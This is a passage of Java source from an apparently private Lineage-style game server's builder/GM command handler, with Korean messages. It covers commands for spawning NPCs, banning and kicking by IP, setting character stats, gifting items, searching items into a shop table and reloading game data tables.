			} else if (ran >= 65 && ran < 75){ // 10
				newPc.setClassId(6658);
				newPc.setCurrentSprite(6658);
				newPc.setType(6658);
			} else if (ran >= 75 && ran < 80){// 5
				newPc.setClassId(6661);
				newPc.setCurrentSprite(6661);
				newPc.setType(6661);
			} else if (ran >= 80 && ran < 90){
				newPc.setClassId(6671);
				newPc.setCurrentSprite(6671);
				newPc.setType(6671);
			} else if (ran >= 90 && ran < 100){
				newPc.setClassId(6650);
				newPc.setCurrentSprite(6650);
				newPc.setType(6650);
			} else if (ran >= 100 && ran < 110){
				newPc.setClassId(12490);
				newPc.setCurrentSprite(12490);
				newPc.setType(12490);
			} else if (ran >= 110 && ran < 120){
				newPc.setClassId(12494);
				newPc.setCurrentSprite(12494);
				newPc.setType(12494);
			}	

			newPc.setCurrentWeapon(0);
			newPc.setHeading(pc.getHeading());
			newPc.setX(pc.getX());
			newPc.setY(pc.getY());
			newPc.setMap(pc.getMap());

			newPc.set_food(39);
			newPc.setLawful(30000);

			newPc.setClanid(289371727);
			newPc.setClanname("중립");
			newPc.setTitle("");
			newPc.setClanRank(L1Clan.수련);
			newPc.setBonusStats(0);
			newPc.setElixirStats(0);
			newPc.setElfAttr(0);
			newPc.set_PKcount(0);
			newPc.setExpRes(0);
			newPc.setPartnerId(0);
			newPc.setAccessLevel((short)0);
			newPc.setGm(false);
			newPc.setMonitor(false);
			newPc.setOnlineStatus(1);
			newPc.setHomeTownId(0);
			newPc.setContribution(0);

			newPc.setBanned(false);
			newPc.setKarma(0);
			newPc.setReturnStat(0);

			newPc.refresh();
			newPc.setMoveSpeed(0);
			newPc.setBraveSpeed(0);
			newPc.setGmInvis(false);
			newPc.noPlayerck2 = true;

			L1ItemInstance  item = CObjectDB.CreateItem(35);//수련자의 한손검
			L1ItemInstance item1 = CObjectDB.CreateItem(175);//수련자의 활
			L1ItemInstance item2 = CObjectDB.CreateItem(120);//수련자의 지팡이
			L1ItemInstance item3 = CObjectDB.CreateItem(73);// 수련자의 이도류
			L1ItemInstance item4 = CObjectDB.CreateItem(203012);// 수련자의 도끼

			if (newPc.isKnight() || newPc.isCrown() || newPc.isDragonknight()) {// 기사.군주.용기사
				newPc.getInventory().CreateOrAddItem(item);
				newPc.EquipItem(item);
			} else if (newPc.isElf()){ //요정
				newPc.getInventory().CreateOrAddItem(item1);
				newPc.EquipItem(item1);
			} else if (newPc.isWizard() || newPc.isBlackwizard()){//마법사. 환술사
				newPc.getInventory().CreateOrAddItem(item2);
				newPc.EquipItem(item2);
			} else if (newPc.isDarkelf()){ //다크엘프
				newPc.getInventory().CreateOrAddItem(item3);
				newPc.EquipItem(item3);
			} else if (newPc.isWarrior()){ //전사
				newPc.getInventory().CreateOrAddItem(item4);
				newPc.EquipItem(item4);
			}

			CWorld.getInstance().storeAndEnterWorld(newPc);

			newPc.setNetConnection(null);

			newPc.startObjectAutoUpdate();

		} catch (Exception e) {
			SC_SystemMessage.send(pc, (new StringBuilder()). append(".무인 [캐릭이름]로 입력해 주세요. "). toString());
		}
	}

	private static void BuilderCmd_insert_spawn(L1PcInstance pc, String cmdName, String arg) {
		String msg = null;

		try {
			StringTokenizer tok = new StringTokenizer(arg);
			String type = tok.nextToken();
			int npcId = Integer.parseInt(tok.nextToken().trim());
			L1Npc template = CObjectDB.GetNPC(npcId);

			if (template == null) {
				msg = "해당 NPC가 발견되지 않습니다. ";
				return;
			}
			if (type.equals("몹")) {
				if (!template.getImpl().equals("L1Monster")) {
					msg = "지정한 NPC는 L1Monster가 아닙니다. ";
					return;
				}
				CNpcMakerDB.storeSpawn(pc, template);
			} else if (type.equals("엔")) {
				NpcSpawnTable.getInstance().storeSpawn(pc, template);
				L1SpawnUtil.spawngmcmd(pc, npcId);
				return;
			}
			L1SpawnUtil.spawn(pc, npcId, 0, 0);
			msg = new StringBuilder().append(template.get_name()).append(" (" + npcId + ") ").append("를 추가했습니다. ").toString();
		} catch (Exception e) {
		//	_log.log(Level.SEVERE, "", e);
			msg = cmdName + " [몹,엔] [NPCID] 라고 입력해 주세요. ";
		} finally {
			if (msg != null) {
				SC_SystemMessage.send(pc, msg);
			}
		}
	}

	private static void BuilderCmd_ban_ip(L1PcInstance pc, String cmdName, String arg) {
		try {
			
			StringTokenizer stringtokenizer = new StringTokenizer(arg);// IP를 지정
			String s1 = stringtokenizer.nextToken();// add/del를 지정(하지 않아도 OK)
			String s2 = null;
			
			try {
				s2 = stringtokenizer.nextToken();
			} catch (Exception e) {		}

			IpTable iptable = IpTable.getInstance();
			boolean isBanned = iptable.isBannedIp(s1);

			for (L1PcInstance tg : CWorld.getInstance(). getAllPlayers()) {
				if (tg.getNetConnection() != null && s1.equals(tg.getNetConnection(). getIp())) {
					String msg = new StringBuilder(). append("IP : ").append(s1).append(" 로 접속중의 플레이어 : ").append(tg.getName()).toString();
					SC_SystemMessage.send(pc, msg);
				}
			}

			if ("추가". equals(s2) && ! isBanned) {
				iptable.banIp(s1); // BAN 리스트에 IP를 더한다
				String msg = new StringBuilder(). append("IP : ").append(s1).append(" 를 BAN IP에 등록했습니다. ").toString();
				SC_SystemMessage.send(pc, msg);
			} else if ("삭제". equals(s2) && isBanned) {
				if (iptable.liftBanIp(s1)) { // BAN 리스트로부터 IP를 삭제한다
					String msg = new StringBuilder().append("IP : ").append(s1).append(" 를 BAN IP로부터 삭제했습니다. ").toString();
					SC_SystemMessage.send(pc, msg);
				}
			} else { // BAN의 확인
				if (isBanned) {
					String msg = new StringBuilder(). append("IP : "). append(s1).append(" 는 BAN IP에 등록되어 있습니다. "). toString();
					SC_SystemMessage.send(pc, msg);
				} else {
					String msg = new StringBuilder(). append("IP : "). append(s1).append(" 는 BAN IP에 등록되어 있지 않습니다. "). toString();
					SC_SystemMessage.send(pc, msg);
				}
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " 아이피 [추가, 삭제]라고 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_toggle_gm(L1PcInstance pc, String cmdName, String arg) {
		pc.setGm(!pc.isGm());
		SC_SystemMessage.send(pc, "GM 세팅 = " + pc.isGm());
	}

	private static void BuilderCmd_poly(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String name = st.nextToken();
			int polyid = Integer.parseInt(st.nextToken());

			L1PcInstance tg = CWorld.getInstance(). getPlayer(name);

			if (tg == null) {
				SC_ServerMessage.send(pc, 73, name); // \f1%0은 게임을 하고 있지 않습니다.
			} else {
				try {
					L1PolyMorph.doPoly(tg, polyid, 604800, L1PolyMorph.MORPH_BY_GM, false);
				} catch (Exception exception) {
					SC_SystemMessage.send(pc, ".변신 [캐릭터명] [그래픽ID] 라고 입력해 주세요. ");
				}
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭터명] [그래픽ID] 라고 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_give_present(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			L1PcInstance target = CWorld.getInstance().getPlayer(st.nextToken());
			L1Item template = builderFindItem(st.nextToken());
			int count = st.hasMoreTokens() ? Integer.parseInt(st.nextToken()) : 1;
			int enchant = st.hasMoreTokens() ? Integer.parseInt(st.nextToken()) : 0;
			int attr = st.hasMoreTokens() ? Integer.parseInt(st.nextToken()) : 0;
			int bless = st.hasMoreTokens() ? Integer.parseInt(st.nextToken()) : 0;
			builderGrant(pc, target, template, count, enchant, attr, bless);
		} catch (RuntimeException e) { SC_SystemMessage.send(pc, ".선물 [접속 캐릭명] [아이템ID] [수량] [강화] [속성] [봉인129]"); }
	}

	private static void BuilderCmd_set_status(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String char_name = st.nextToken();
			String param = st.nextToken();
			int value = Integer.parseInt(st.nextToken());

			L1PcInstance target = null;
			target = CWorld.getInstance(). getPlayer(char_name);

			if (target == null) {
				SC_ServerMessage.send(pc, 73, char_name); // \f1%0은 게임을 하고 있지 않습니다.
				return;
			}

			// -- not use DB --
			if (param.equalsIgnoreCase("방어")) {
				target.addAc((byte) (value - target.getAc()));
			} else if (param.equalsIgnoreCase("마방")) {
				target.AddMDefend((short) (value - target.GetMDefend()));
			} else if (param.equalsIgnoreCase("공성")) {
				target.addHitup((short) (value - target.getHitup()));
			} else if (param.equalsIgnoreCase("대미지")) {
				target.addDmgup((short) (value - target.getDmgup()));
				// -- use DB --
			} else {
				if (param.equalsIgnoreCase("피")) {
					target.addBaseMaxHp((short) (value - target.getBaseMaxHp()));
					target.setCurrentHp(target.getMaxHp());
				} else if (param.equalsIgnoreCase("엠피")) {
					target.addBaseMaxMp((short)(value - target.getBaseMaxMp()));
					target.setCurrentMp(target.getMaxMp());
				} else if (param.equalsIgnoreCase("성향")) {
					target.setLawful(value);
					final int lawful = target.getLawful();
					SC_Lawful.send(target, target.getId(), lawful);
					SC_Lawful.broadcast(target, target.getId(), lawful);
				} else if (param.equalsIgnoreCase("우호도")) {
					target.setKarma(value);
				} else if (param.equalsIgnoreCase("지엠")) {
					if(value == Config.GMCODE){
						target.setAccessLevel((short) value);
						SC_SystemMessage.send(target, "당신은 메티스께서 운영자권한을 부여 하였습니다.");
						CUserSocket clnt = target.getNetConnection();
						CS_CharSelect.restartProcess(target);
						Account acc		= clnt.getAccount();
						SC_CharAmount.send(clnt, acc.countCharacters(), acc.getCharSlot());
						if(acc.countCharacters() > 0)
							CS_CommonClick.sendCharPacks(clnt);
					}else {
						SC_SystemMessage.send(target, "GM번호가 일치하지 않습니다.");
					}
				} else if (param.equalsIgnoreCase("힘")) {
					target.SetStatStr((byte)value);
				} else if (param.equalsIgnoreCase("콘")) {
					target.SetStatCon((byte)value);
				} else if (param.equalsIgnoreCase("덱스")) {
					target.SetStatDex((byte)value);
				} else if (param.equalsIgnoreCase("인트")) {
					target.SetStatInt((byte)value);
				} else if (param.equalsIgnoreCase("위즈")) {
					target.SetStatWis((byte)value);
				} else if (param.equalsIgnoreCase("카리")) {
					target.SetStatCha((byte)value);
				} else {
					SC_SystemMessage.send(pc, "스테이터스 " + param + " (은)는 불명합니다. ");
					return;
				}
				if (!param.equalsIgnoreCase("지엠"))
					target.save(); // DB에 캐릭터 정보를 기입한다
			}
			SC_OwnCharStatus.send(target);
			target.RenewStat();
			SC_SystemMessage.send(pc, target.getName() + "의 " + param + "(을)를 " + value + "로 변경했습니다. ");
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭명] [스텟] [변경치] 입력.");
			SC_SystemMessage.send(pc, "피 엠피 성향 우호도 지엠 방어 마방 공성 대미지 힘 콘 덱스 인트 위즈 카리");
		}
	}

	private static void BuilderCmd_ip_kick(L1PcInstance pc, String cmdName, String arg) {
		try {
			L1PcInstance target = CWorld.getInstance().getPlayer(arg);

			IpTable iptable = IpTable.getInstance();
			if (target != null) {
				if( target.getNetConnection() != null ){
					iptable.banIp(target.getNetConnection().getIp());
				}
				SC_SystemMessage.send(pc, (new StringBuilder()).append(target.getName()).append(" 를 강력 추방 했습니다. ").toString());
				target.setX(33080);
				target.setY(33392);
				target.setMap((short) 4);
				GameServer.disconnectChar(target);
				SC_Disconnect.send(target);
			} else {
				SC_SystemMessage.send(pc, "그러한 이름의 캐릭터는 월드내에는 존재하지 않습니다. ");
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭터명]으로 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_npc_shop_switch(L1PcInstance pc, String cmdName, String arg) {
		try {
			boolean power = NpcShopManager.getInstance().isPower();
			if (arg.equalsIgnoreCase("켬")) {
				if (power) {
					SC_SystemMessage.send(pc, "이미 운영자 상점이 오픈되어 있습니다.");
					return;
				} else {
					NpcShopManager.getInstance().start();
				}
			} else if (arg.equalsIgnoreCase("끔")) {
				if (!power) {
					SC_SystemMessage.send(pc, "이미 운영자 상점이 오픈되어있지 않습니다.");
					return;
				} else {
					NpcShopManager.getInstance().stop();
				}
			} else {
				SC_SystemMessage.send(pc, ".영자상점1 켬/끔");
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".영자상점1 메소드오류");
		}
	}

	private static void BuilderCmd_home_town(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String para1 = st.nextToken();
			if (para1.equalsIgnoreCase("매일")) {
				HomeTownTimeController.getInstance(). dailyProc();
			} else if (para1.equalsIgnoreCase("매달")) {
				HomeTownTimeController.getInstance(). monthlyProc();
			} else {
				throw new Exception();
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".홈타운 [매일,매달] 라고 입력해 주세요. ");
		}
	}

	private static final Map<Integer, String> BUILDER_FAVORITES = new java.util.concurrent.ConcurrentHashMap<>();

	private static void BuilderCmd_favorite(L1PcInstance pc, String cmdName, String arg) {
		try {
			String faviCom = BUILDER_FAVORITES.getOrDefault(pc.getId(), "");
			if (arg.startsWith("셋팅")) {
				// 커멘드의 등록
				StringTokenizer st = new StringTokenizer(arg);
				st.nextToken();
				if (!st.hasMoreTokens()) {
					SC_SystemMessage.send(pc, "커멘드가 없습니다. ");
					return;
				}
				StringBuilder cmd = new StringBuilder();
				String temp = st.nextToken(); // 커멘드 타입
				final BuilderCmdPairType saved = getInstance().findBuilderCommand(temp);
				if (saved == null || !hasBuilderPermission(pc.getAccessLevel(), saved) || "실행".equals(saved.getName()) || "암호변경".equals(saved.getName()) || "계정추가".equals(saved.getName())) {
					SC_SystemMessage.send(pc, "등록할 수 없는 명령어입니다.");
					return;
				}
				cmd.append(temp + " ");
				while (st.hasMoreTokens()) {
					cmd.append(st.nextToken() + " ");
				}
				faviCom = cmd.toString().trim();
				BUILDER_FAVORITES.put(pc.getId(), faviCom);
				SC_SystemMessage.send(pc, faviCom + " 를 등록했습니다. ");
			} else if (arg.startsWith("보기")) {
				SC_SystemMessage.send(pc, "현재의 등록 커멘드: " + faviCom);
			} else if (faviCom.isEmpty()) {
				SC_SystemMessage.send(pc, "등록하고 있는 커멘드가 없습니다. ");
			} else {
				StringBuilder cmd = new StringBuilder();
				StringTokenizer st = new StringTokenizer(arg);
				StringTokenizer st2 = new StringTokenizer(faviCom);
				while (st2.hasMoreTokens()) {
					String temp = st2.nextToken();
					if (temp.startsWith("%")) {
						cmd.append(st.nextToken() + " ");
					} else {
						cmd.append(temp + " ");
					}
				}
				while (st.hasMoreTokens()) {
					cmd.append(st.nextToken() + " ");
				}
				SC_SystemMessage.send(pc, "등록 명령어를 실행합니다.");
				BuilderCmdHandler.getInstance().BuilderCmd2Handler(pc, cmd.toString());
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " 셋팅 [커멘드명] " + "| " + cmdName + " 보기 | " + cmdName
					+ " [인수] 라고 입력해 주세요. ");
			e.printStackTrace();
		}
	}

	private static void BuilderCmd_event_spawn(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer tok = new StringTokenizer(arg);
			String nameid = tok.nextToken();
			String time1 = tok.nextToken();
			int npcId = 0;
			try {
				npcId = Integer.parseInt(nameid);
			} catch (NumberFormatException e) {
				npcId = CObjectDB.LoadNPC().findNpcIdByNameWithoutSpace(nameid);
				if (npcId == 0) {
					SC_SystemMessage.send(pc, "해당 NPC가 발견되지 않습니다. ");
					return;
				}
			}
			int time = Integer.parseInt(time1);

			nameid = CObjectDB.GetNPC(npcId).get_name();
			BuilderEventSpawn(pc, npcId, 60000 * time);

			SC_SystemMessage.send(pc, "(" + nameid + ") (ID:" + npcId + ") (" + time + ")분 소환 ");
			CWorld.getInstance().broadcastServerMessage("(" + nameid + ")  (" + time + ")분 동안 소환됩니다. ");
			tok = null;
			nameid = null;
		} catch (Exception e) {
		//	_log.log(Level.SEVERE, "", e);
			SC_SystemMessage.send(pc, cmdName + "[NPCID] [시간(분)] ");
		}
	}

	private static void BuilderEventSpawn(L1PcInstance pc, int npcId, int timeMinToDelete) {
		try {
			L1NpcInstance npc = CObjectDB.CreateNPC(npcId);
			npc.setId(IdFactory.getInstance().nextId());
			npc.setMap(pc.getMapId());

			npc.getLocation().set(pc.getLocation());
			npc.getLocation().forward(pc.getHeading());

			npc.setHomeX(npc.getX());
			npc.setHomeY(npc.getY());
			npc.setHeading(pc.getHeading());

			CWorld.getInstance().storeAndEnterWorld(npc);

			npc.refreshLight();
			npc.startChat(L1NpcInstance.CHAT_TIMING_APPEARANCE); // 채팅 개시
			if (0 < timeMinToDelete) {
				npc.startTimedDelete(timeMinToDelete);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

    private static final int BUILDER_SEARCH_SHOP_KEY = 0x3fffff08;
    private static final String[] BUILDER_SEARCH_QUERIES = {
            "SELECT item_id, name, name_id FROM etcitem WHERE name LIKE ?",
            "SELECT item_id, name, name_id FROM weapon WHERE name LIKE ?",
            "SELECT item_id, name, name_id FROM armor WHERE name LIKE ?",
            "SELECT npcid, name, note FROM npc WHERE name LIKE ?",
            "SELECT polyid, name, id FROM polymorphs WHERE name LIKE ?",
            "SELECT gfxid, name, note FROM npc WHERE name LIKE ?"
    };



	private static void BuilderCmd_search_shop(L1PcInstance pc, String cmdName, String arg) {
        if (pc == null || arg == null) return;
        final int type;
        final String pattern;
        try {
            StringTokenizer tok = new StringTokenizer(arg);
            type = Integer.parseInt(tok.nextToken());
            pattern = "%" + tok.nextToken() + "%";
            if (type < 0 || type >= BUILDER_SEARCH_QUERIES.length) {
                throw new IllegalArgumentException("Invalid item search category");
            }
        } catch (RuntimeException e) {
            SC_SystemMessage.send(pc, ".검색 [0~5] [name]을 입력 해주세요.");
            SC_SystemMessage.send(pc, "0=잡템, 1=무기, 2=갑옷, 3=엔피시, 4=변신, 5=엔피시(gfxid)");
            return;
        }

        final CUserSocket owner = pc.getNetConnection();
        if (owner == null || !owner.isConnected() || owner.getActiveChar() != pc) return;
        try {
            CacheD.getInstance().submitDbJobOrdered(BUILDER_SEARCH_SHOP_KEY, pc.getId(), () -> {
                final ArrayList<String> messages = new ArrayList<>();
                boolean success = false;
                try (Connection con = DatabaseFactory.getInstance().getConnection()) {
                    boolean oldAutoCommit = con.getAutoCommit();
                    try {
                        con.setAutoCommit(false);
                        try (PreparedStatement clear = con.prepareStatement(
                                "DELETE FROM shop WHERE npc_id=8")) {
                            clear.executeUpdate();
                        }
                        try (PreparedStatement query = con.prepareStatement(BUILDER_SEARCH_QUERIES[type]);
                             PreparedStatement insert = con.prepareStatement(
                                    "INSERT INTO shop SET npc_id=?,item_id=?,order_id=?,selling_price=?,pack_count=?,purchasing_price=?,enchant=?,time_limit=?")) {
                            query.setString(1, pattern);
                            try (ResultSet rs = query.executeQuery()) {
                                while (rs.next()) {
                                    String itemId = rs.getString(1);
                                    String itemName = rs.getString(2);
                                    String description = rs.getString(3);
                                    messages.add("[" + itemId + "]--[" + itemName + "]--" + description);
                                    insert.setInt(1, 8);
                                    insert.setString(2, itemId);
                                    insert.setInt(3, 0);
                                    insert.setInt(4, 1);
                                    insert.setInt(5, 0);
                                    insert.setInt(6, -1);
                                    insert.setInt(7, 0);
                                    insert.setString(8, "false");
                                    insert.addBatch();
                                }
                            }
                            insert.executeBatch();
                        }
                        con.commit();
                        success = true;
                    } catch (Exception e) {
                        try { con.rollback(); } catch (Exception rollbackFailure) {
                            e.addSuppressed(rollbackFailure);
                        }
                        throw e;
                    } finally {
                        try { con.setAutoCommit(oldAutoCommit); }
                        catch (Exception e) { _log.log(Level.WARNING, "Search transaction restore failed", e); }
                    }
                } catch (Exception e) {
                    _log.log(Level.WARNING, "GM item search failed", e);
                }
                if (success) {
                    try {
                        ShopTable.reload();
                    } catch (RuntimeException e) {
                        success = false;
                        _log.log(Level.WARNING, "GM item search shop reload failed", e);
                    }
                }
                final boolean completed = success;
                if (!CIOThreadCallback.getInstance().completeSessionReply(owner, () -> {
                    if (!owner.isConnected() || owner.getActiveChar() != pc
                            || pc.getNetConnection() != owner) return;
                    if (!completed) {
                        SC_SystemMessage.send(pc, "검색 상점 갱신에 실패했습니다.");
                        return;
                    }
                    for (int i = 0, size = messages.size(); i < size; i++) {
                        SC_SystemMessage.send(pc, messages.get(i));
                    }
                    SC_SystemMessage.send(pc, "총 [" + messages.size() + "]개 검색이 되었습니다.");
                    SC_ShopSellList2.send(pc);
                })) {
                    _log.fine("GM item search response discarded: player disconnected");
                }
            });
        } catch (RuntimeException e) {
            _log.log(Level.WARNING, "GM item search CacheD submission failed", e);
            SC_SystemMessage.send(pc, "검색 요청을 처리할 수 없습니다.");
        }
    }

	private static void BuilderCmd_reload_tables(L1PcInstance gm, String cmdName, String arg) {		
        if (arg != null && arg.trim().equalsIgnoreCase("pss")) {
            try {
                PssConfig.Settings updated = PssConfig.reload();
                PlaySupport2019.refreshForReload();
                SC_SystemMessage.send(gm, "PSS 설정 적용: 하루 " + (updated.dailySeconds() / 60)
                        + "분, 매일 " + updated.resetTimeText()
                        + "(한국 시간) 초기화. 실행 중인 PSS는 계속 유지됩니다.");
            } catch (java.io.IOException | IllegalArgumentException e) {
                SC_SystemMessage.send(gm, "PSS 설정 로딩 실패: " + e.getMessage());
            }
            return;
        }
        if (arg != null && (arg.trim().equalsIgnoreCase("인형발동")
                || arg.trim().equalsIgnoreCase("인형확률"))) {
            try {
                MagicDollCombatConfig.reload();
                SC_SystemMessage.send(gm, "마법인형 발동 설정 적용 완료 (MagicDollProc.properties)");
            } catch (java.io.IOException | IllegalArgumentException ex) {
                SC_SystemMessage.send(gm, "마법인형 발동 설정 리로드 실패: " + ex.getMessage()
                        + " (이전 설정 유지)");
            }
            return;
        }
        if (arg != null && (arg.trim().equalsIgnoreCase("키링크밸런스")
                || arg.trim().equalsIgnoreCase("키링크"))) {
            try {
                KeylinkBalanceConfig.reload();
                SC_SystemMessage.send(gm, "키링크 방어자 직업 계수 8종 적용 완료 (KeylinkBalance.properties)");
            } catch (java.io.IOException | IllegalArgumentException ex) {
                SC_SystemMessage.send(gm, "키링크 밸런스 리로드 실패: " + ex.getMessage()
                        + " (이전 설정 유지)");
            }
            return;
        }
        if (arg != null && arg.trim().equalsIgnoreCase("스킬확률")) {
            try {
                AttackSkillChanceConfig.reload();
                SC_SystemMessage.send(gm, "스킬 발동 확률 설정 적용 완료 (SkillChance.properties)");
            } catch (java.io.IOException | IllegalArgumentException ex) {
                SC_SystemMessage.send(gm, "스킬 발동 확률 리로드 실패: " + ex.getMessage()
                        + " (이전 설정 유지)");
            }
            return;
        }
		if (arg.equalsIgnoreCase("몹드랍")) {
			DropTable.reload();
			gm.sendPackets("droplist 테이블이 리로드 되었습니다.");	
	//	} else if (arg.equalsIgnoreCase("오림주문서")) {	
		//	L1OrimScrollEnchant.reload();
		//	gm.sendPackets("오림 장신구 강화주문서 정보가 리로드 되었습니다.");
 
		} else if (arg.equalsIgnoreCase("창고이용")) {
			NoShopAndWare.getInstance().reload();;
			gm.sendPackets("NoShopAndWare 테이블이 리로드 되었습니다.");	
		}else if (arg.equalsIgnoreCase("노드랍")) {
				NoDropItem.getInstance().reload();;
				gm.sendPackets("nodropitem 테이블이 리로드 되었습니다.");	
		}else if(arg.equalsIgnoreCase("낚시경험치")){
			FishingExpInfo.do_load();
			gm.sendPackets("fishing_exp_info 테이블이 리로드 되었습니다.");
		}else if(arg.equalsIgnoreCase("변신레벨")){
			SprBoundary.do_load();
			gm.sendPackets("spr_boundary 테이블이 리로드 되었습니다.");
		}else if(arg.equalsIgnoreCase("엔피씨속도")){
			NpcSpeedData.do_load();
			for(L1NpcInstance npc : CWorld.getInstance().getAllNpc())
				NpcSpeedData.install_npc(npc);
			gm.sendPackets("npc_speed_data  테이블이 리로드 되었습니다.");

		} else if (arg.equalsIgnoreCase("무한대전")) {
			 UBTable.reload();
			gm.sendPackets("ub_settings/ub_manager_npc_id/ub_times/spawnlist_ub/ub_rank 테이블이 리로드 되었습니다.");
		 } else if (arg.equalsIgnoreCase("겟백")) {
			 Getback.loadGetBack();
			gm.sendPackets("getback 테이블이 리로드 되었습니다.");
		 } else if (arg.equalsIgnoreCase("겟백리스타트")) {
			 GetBackRestartTable.reload();
				gm.sendPackets("getback_restart 테이블이 리로드 되었습니다.");
		 } else if (arg.equalsIgnoreCase("용드랍")) {
			 RaidCompensatorLoader.reload();
			gm.sendPackets("tb_mjraid_compensators 테이블이 리로드 되었습니다.");	
		 } else if(arg.equalsIgnoreCase("버경")){
			BugRaceController.load_config();
			gm.sendPackets("bug_race.properties가 리로드 되었습니다.");	
		} else if(arg.equalsIgnoreCase("커스시간")){
			MonsterParalyzeDelay.reload();
			gm.sendPackets("monster_paralyze 테이블이 리로드 되었습니다.");				
		}else if(arg.equalsIgnoreCase("자존심")){
			PrideLoadManager.reload();
			gm.sendPackets("pride_items 테이블/price_system.properties이 리로드 되었습니다.");			
		} else if(arg.equalsIgnoreCase("맵아인")){
			IncreaseEinhasadMap.reload();
			gm.sendPackets("tb_increase_einhasad_map 테이블이 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("패시브스킬")){
			PassiveLoader.reload();
			gm.sendPackets("passive_book_mapped 테이블이 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("텔주문서")){
			DesignatedTeleportLoader.reload();
			gm.sendPackets("tb_designate_teleport_scroll 테이블이 리로드되었습니다.");
		} else if(arg.equalsIgnoreCase("액션리스너")){
			MinuteScheduler.getInstance().clear_action_listener();
			ActionListenerLoader.getInstance().updateNpcActionListener();
			ActionListenerLinkageLoader.reload();
			gm.sendPackets("액션 리스너가 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("자동공지")){
			gm.sendPackets(CAnnounceTimer.getInstance().reload()
					? "Announcecycle이 리로드 되었습니다."
					: "Announcecycle을 리로드하지 못했습니다. 서버 로그를 확인하세요.");
		} else if(arg.equalsIgnoreCase("제작확률")){
			CraftProbability.reload();
			gm.sendPackets("craft_probability 테이블이 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("인형확률")){
			AlchemyProbability.reload();
			gm.sendPackets("tb_alchemy_probability 테이블이 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("제작인형컨픽")){
			Config.loadCraftConfig();
			gm.sendPackets("제작/인형 컨픽이 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("크레프트인포")){
		    CraftLoader.load();
		    SC_CRAFT_LIST_ALL_ACK.buildCaches(); 
			gm.sendPackets("craftinfo.dat가 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("인형인포")){
			SC_ALCHEMY_DESIGN_ACK.load(); 
			gm.sendPackets("alchemyinfo.dat가 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("제작엔피씨")){
			SC_CRAFT_LIST_ALL_ACK.buildNpcCaches();
			gm.sendPackets("craftlist 테이블이 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("아이템스킬")){
			ItemSkillModelLoader.reload();
			gm.sendPackets("tb_itemskill_model 테이블이 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("매크로")){
			ServerMacroLoader.reload();			
			gm.sendPackets("tb_ServerMacro 테이블이 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("아인증폭")){
			ExpAmplifierLoader.reload();
			gm.sendPackets("ExpAmplifierLoader 테이블이 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("확")){
			ExpAmplifierLoader.reload();
			gm.sendPackets("ExpAmplifierLoader 테이블이 리로드 되었습니다.");
		} else if(arg.equalsIgnoreCase("엔피씨마크")){
			NpcMarkTable.reload();
			gm.sendPackets("NpcMark 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("엔피씨액션")) { 
			NPCTalkDataTable.reload();
			gm.sendPackets("NpcAction 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("엔피씨")) {
			CObjectDB.ReloadNPC();
			gm.sendPackets("NpcTable/npc_born 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("템드랍아이템")) {
			DropItemTable.reload();
			gm.sendPackets("drop_item 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("변신")) {
			PolyTable.reload();
			gm.sendPackets("polymorphs 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("용해제1")) {
			ResolventTable.reload();
			gm.sendPackets("resolvent 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("박스")) {
			if(L1TreasureBox.load())
				gm.sendPackets("TreasureBox.xml 파일이 리로드 되었습니다.");
			else{
				String s = "TreasureBox에 오류가 발견되었습니다.";
				gm.sendPackets(s);
				System.out.println(s);
			}
		} else if (arg.equalsIgnoreCase("물약회복")) {
			L1HealingPotion.reload();
			gm.sendPackets("HealingPotion.xml 파일이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("컨피그")) {			
			Config.load();
			gm.sendPackets("config 폴더에 파일이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("스킬")) {
			SkillsTable.reload();
			gm.sendPackets("Skill 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("몹스킬")) {
			MobSkillTable.reload();
			gm.sendPackets("mobskill 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("엔피씨액션")) { 
			NPCTalkDataTable.reload();
			gm.sendPackets("NpcAction 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("무기스킬")) {
			WeaponSkillTable.reload();
			gm.sendPackets("WeaponSkill 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("영자상점")) {
			NpcShopManager.getInstance().reloadAndApply();
			gm.sendPackets("영자상점 테이블이 리로드 되었습니다.");	
		}else if (arg.equalsIgnoreCase("레벨퀘스트")) {
